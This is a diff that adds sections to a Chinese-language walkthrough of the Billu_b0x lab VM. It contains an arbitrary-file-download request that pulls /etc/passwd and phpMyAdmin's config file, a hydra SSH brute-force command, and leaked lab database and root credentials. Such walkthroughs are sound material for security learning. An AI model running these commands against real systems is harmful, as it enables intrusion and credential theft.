@@ -18,7 +18,7 @@ tags:
 
 This Virtual machine is using ubuntu (32 bit)
 
-Other packages used: -
+Other packages used: 
 
 - PHP
 - Apache
@@ -227,5 +227,183 @@ bash: no job control in this shell
 
 
 
-## 未完待续
+## 0x42 第二种思路
+
+
+
+### 0x421 任意文件下载
+
+这里可以通过 `任意文件下载` 将 `/etc/passwd` 下载。
+
+`passwd` :
+
+```
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh
+news:x:9:9:news:/var/spool/news:/bin/sh
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+proxy:x:13:13:proxy:/bin:/bin/sh
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/bin/sh
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+syslog:x:101:103::/home/syslog:/bin/false
+mysql:x:102:105:MySQL Server,,,:/nonexistent:/bin/false
+messagebus:x:103:106::/var/run/dbus:/bin/false
+whoopsie:x:104:107::/nonexistent:/bin/false
+landscape:x:105:110::/var/lib/landscape:/bin/false
+sshd:x:106:65534::/var/run/sshd:/usr/sbin/nologin
+ica:x:1000:1000:ica,,,:/home/ica:/bin/bash
+```
+
+得到用户  `root` 、`ica` 。由于 `/etc/shadow` 文件无法下载，所以这里只能够直接爆破 `ssh` 了。
+
+
+
+### 0x422 爆破 ssh
+
+首先检查 `/etc/ssh/sshd_config` 查看允许哪些用户登陆。
+
+运气很好，我发现了 `PermitRootLogin yes`，那就直接爆破 `root` 吧。
+
+`hydra -l root -P password.txt ssh://192.168.248.161`
+
+![Billu_b0x_12](/image/2019-04-24-Billu_b0x_writeup/Billu_b0x_12.png)
+
+好的，我们成功得到了 `root` 的密码，完成了渗透。
+
+
+
+## 0x43 第三种思路
+
+由于我们发现了 `phpmyadmin` ，我们可以连接数据库，从数据库中找到网站的登陆账号以及密码。
+
+[**`index.php`**](/image/2019-04-24-Billu_b0x_writeup/index.php) 很明显的调用了数据库，我们可以从这里入手，但是没有看见任何创建数据库连接的语句，所有应该是在某个包含文件的地方连接了数据库。
+
+这里有两个包含文件：`c.php` 、`head.php`。
+
+`c.php` :
+
+```php
+<?php
+#header( 'Z-Powered-By:its chutiyapa xD' );
+header('X-Frame-Options: SAMEORIGIN');
+header( 'Server:testing only' );
+header( 'X-Powered-By:testing only' );
+
+ini_set( 'session.cookie_httponly', 1 );
+
+$conn = mysqli_connect("127.0.0.1","billu","b0x_billu","ica_lab");
+
+// Check connection
+if (mysqli_connect_errno())
+  {
+  echo "connection failed ->  " . mysqli_connect_error();
+  }
+
+?>
+```
+
+ 简单的审计后发现 `c.php` 中存在数据库的账号密码，所有我们便可以利用了。
+
+
+
+### 0x431 获得网站账号密码
+
+首先登陆 `phpmyadmin`
+
+![Billu_b0x_8 ](/image/2019-04-24-Billu_b0x_writeup/Billu_b0x_8.png)
+
+然后我们发现了 `ica_lab` 数据库。
+
+![Billu_b0x_9](/image/2019-04-24-Billu_b0x_writeup/Billu_b0x_9.png)
+
+进入数据库后，发现了三个表。
+
+![Billu_b0x_10](/image/2019-04-24-Billu_b0x_writeup/Billu_b0x_10.png)
+
+经过刚才审计 `index.php` 中可得 `auth` 表中存在着账号密码，进入 `auth`  表。
+
+![Billu_b0x_11](/image/2019-04-24-Billu_b0x_writeup/Billu_b0x_11.png)
+
+到这里，我们就获得了账号以及密码。
+
+账号：`biLLu`
+
+密码：`hEx_it`
+
+
+
+### 0x432 文件上传 && 文件包含 && 反弹 shell 
+
+这里和 `第一种思路` 中的方法是同样的，所以不再赘述了。
+
+
+
+### 0x433 提权
+
+这里和 `第一种思路` 中的方法是同样的，所以不再赘述了。
+
+
+
+## 0x44 第四种思路
+
+### 检查 phpmyadmin 配置文件
+
+这里主要是靠运气，当看见 `phpmyadmin` 的登陆页面的时候，脑子里突然出现了一个大胆的想法，就是检查一下 `phpmyadmin` 的配置文件，然而果不其然。
+
+`curl http://192.168.248.161/test.php --data file=phpmy/config.inc.php > config.inc.php`
+
+`config.inc.php` :
+
+```php
+<?php
+
+/* Servers configuration */
+$i = 0;
+
+/* Server: localhost [1] */
+$i++;
+$cfg['Servers'][$i]['verbose'] = 'localhost';
+$cfg['Servers'][$i]['host'] = 'localhost';
+$cfg['Servers'][$i]['port'] = '';
+$cfg['Servers'][$i]['socket'] = '';
+$cfg['Servers'][$i]['connect_type'] = 'tcp';
+$cfg['Servers'][$i]['extension'] = 'mysqli';
+$cfg['Servers'][$i]['auth_type'] = 'cookie';
+$cfg['Servers'][$i]['user'] = 'root';
+$cfg['Servers'][$i]['password'] = 'roottoor';
+$cfg['Servers'][$i]['AllowNoPassword'] = true;
+
+/* End of servers configuration */
+
+$cfg['DefaultLang'] = 'en-utf-8';
+$cfg['ServerDefault'] = 1;
+$cfg['UploadDir'] = '';
+$cfg['SaveDir'] = '';
+
+
+/* rajk - for blobstreaming */
+$cfg['Servers'][$i]['bs_garbage_threshold'] = 50;
+$cfg['Servers'][$i]['bs_repository_threshold'] = '32M';
+$cfg['Servers'][$i]['bs_temp_blob_timeout'] = 600;
+$cfg['Servers'][$i]['bs_temp_log_threshold'] = '32M';
+
+
+?>
+```
+
+竟然发现了 `root` 的账号密码，简直是意外之喜啊。
+
+成功使用这个账号密码登陆，得到 `shell` 。
 
